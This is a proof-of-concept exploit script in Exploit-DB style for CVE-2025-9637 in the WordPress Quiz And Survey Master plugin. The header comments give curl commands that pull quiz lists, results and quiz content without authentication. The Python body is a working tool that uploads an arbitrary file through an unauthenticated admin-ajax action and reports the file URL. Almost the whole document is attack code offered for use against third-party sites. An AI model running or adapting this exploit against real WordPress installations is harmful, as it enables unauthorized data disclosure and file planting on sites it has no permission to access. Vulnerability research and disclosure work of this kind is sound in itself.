#!/usr/bin/env python3
# Exploit Title: WordPress Quiz And Survey Master (QSM) <= 10.3.1 - Unauthenticated Image Upload (Missing Authorization)
# Date: 2026-01-12
# Exploit Author: (Put Your Name Here)
# Vendor Homepage: https://quizandsurveymaster.com/
# Software Link: https://wordpress.org/plugins/quiz-master-next/
# Version: <= 10.3.1
# Tested on: Linux (Docker), WordPress (local)
# CVE: CVE-2025-9637


# Proof of Concept for Quiz data Disclosure

# List quizzes
# curl "http://target/wp-json/qsm/list_quiz"

# Extract results of quiz ID 1
# curl "http://target/wp-json/qsm/list_results/1"

# Enumerate quizzes
# curl "http://target/wp-json/quiz-survey-master/v2/quizzlist/"

# Extract complete quiz content
# curl -X POST "http://target/wp-admin/admin-ajax.php" \
#  -d "action=qsm_get_quiz_to_reload&quiz_id=1" \
#  -H "Content-Type: application/x-www-form-urlencoded"


# Proof of Concept for Unauthenticated Image Upload

from __future__ import annotations

import argparse
import json
import os
import sys
from typing import Any, Dict, Tuple

try:
    import requests  # type: ignore
except ImportError:
    print("[!] Missing dependency: requests. Install with: pip install requests", file=sys.stderr)
    raise


def attempt_upload(
    base_url: str,
    question_id: int,
    file_path: str,
    *,
    mime: str,
    verify_tls: bool,
) -> Tuple[bool, Dict[str, Any]]:
    ajax = base_url.rstrip("/") + "/wp-admin/admin-ajax.php"
    filename = os.path.basename(file_path)

    with open(file_path, "rb") as f:
        files = {"file": (filename, f, mime)}
        data = {"action": "qsm_upload_image_fd_question", "question_id": str(question_id)}
        r = requests.post(
            ajax,
            data=data,
            files=files,
            timeout=30,
            verify=verify_tls,
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"},
        )

    try:
        parsed = r.json()
        payload = parsed if isinstance(parsed, dict) else {"raw": parsed}
    except Exception:
        payload = {"raw": r.text, "status_code": r.status_code, "content_type": r.headers.get("Content-Type", "")}

    # WordPress admin-ajax returns literal "0" when an action is missing/not registered.
    if payload.get("raw") == 0:
        payload["hint"] = (
            "admin-ajax.php returned 0. This typically means the action "
            "'qsm_upload_image_fd_question' is not registered in the running plugin build."
        )

    success = payload.get("type") == "success"
    return success, payload


def main() -> int:
    ap = argparse.ArgumentParser(description="CVE-2025-9637 QSM unauthenticated image upload PoC")
    ap.add_argument("--url", required=True, help="Base site URL (e.g., http://localhost)")
    ap.add_argument("--question-id", required=True, type=int, help="File-upload question ID")
    ap.add_argument("--file", required=True, help="File to upload")
    ap.add_argument("--mime", default="image/png", help="MIME type to send (default: image/png)")
    ap.add_argument("--insecure", action="store_true", help="Disable TLS verification")
    args = ap.parse_args()

    if not os.path.isfile(args.file):
        print(f"[!] File not found: {args.file}", file=sys.stderr)
        return 1

    success, resp = attempt_upload(
        args.url,
        args.question_id,
        args.file,
        mime=args.mime,
        verify_tls=not args.insecure,
    )
    print(json.dumps({"success": success, "response": resp}, indent=2))
    if success:
        print("[+] file_url:", resp.get("file_url"))
        return 0
    return 2


if __name__ == "__main__":
    raise SystemExit(main())

